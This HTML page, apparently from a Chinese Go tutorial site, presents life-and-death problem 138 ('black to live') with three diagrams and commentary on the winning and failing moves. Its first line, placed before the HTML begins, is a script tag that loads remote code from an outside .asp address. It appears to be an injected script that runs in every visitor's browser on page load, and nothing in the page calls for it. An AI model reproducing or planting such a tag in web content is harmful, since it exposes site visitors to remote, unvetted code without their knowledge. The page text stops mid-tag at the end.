<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第138型 黑先活</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第138型     黑先活</span></font><!--mstheme--></font></h1>        <div align="center">          <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">          <tr>            <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No138_1.png" width="232" height="232"><!--mstheme--></font></td>          <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>          <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No138_2.png" width="232" height="232"><!--mstheme--></font></td>       </tr>       <tr>         <td width="45%" valign="top"><!--mstheme--><font face="宋体">           <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>           <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1护住气紧的一边，铁定成活。接下来，白a扳则黑b挡，白c扳则黑d做眼或a位立，均活。</span></font>          <p>　<!--mstheme--></font></td>        <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>        <td width="45%" valign="top"><!--mstheme--><font face="宋体">          <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>          <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1立是另一种活法。白2如点，黑3尖顶即可，白4断则黑5跟打。白2如于3位点，黑则2位尖顶。</span></font><!--mstheme--></font></td>      </tr>      <tr>        <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No138_3.png" width="232" height="232"><!--mstheme--></font></td>       <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>       <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体">         <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>       <!--mstheme--></font></td>     </tr>     <tr>       <td width="45%" valign="top"><!--mstheme--><font face="宋体">         <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>         <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">黑1如立在另一边，不行。白2点，黑3尖顶，白4断，黑5做眼时，白有6位挡的手段，黑两边不入气！黑1如于3位虎，白可于4位点，黑不行。方寸之间，仍可奥妙无穷啊。</span></font></p>       <!--mstheme--></font></td>       <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>       <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     </tr>   </table><!--mstheme--><font face="宋体"></center>   </div>   <p align="center"> <!--webbot bot="Navigation" S-Type="arrows"   S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE"   B-Include-Up="TRUE" U-Page="/C:/Documents and Settings/wangxiaohui/My Documents/My Webs/Weiqi/Part1/shuxing/No9/No9.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script lan
